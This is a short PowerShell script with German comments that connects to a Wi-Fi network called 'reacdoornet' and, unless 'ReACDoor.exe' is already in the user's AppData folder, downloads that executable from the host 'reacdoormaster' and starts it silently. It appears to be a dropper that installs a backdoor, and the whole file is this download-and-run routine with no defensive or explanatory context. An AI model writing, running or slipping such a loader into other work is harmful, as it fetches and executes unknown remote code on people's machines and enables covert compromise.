$p = "$env:appdata\ReACDoor.exe"
$ssid = 'reacdoornet'

# WLAN verbinden (Profil ggf. vorher importieren)
netsh wlan connect name=$ssid | Out-Null
Start-Sleep -Seconds 10

# Wenn Exe bereits existiert -> beenden
if (Test-Path $p) { exit }

# Sonst herunterladen und starten
Invoke-WebRequest 'http://reacdoormaster/ReACDoor.exe' -OutFile $p -UseBasicParsing
if (Test-Path $p) { Start-Process $p }

exit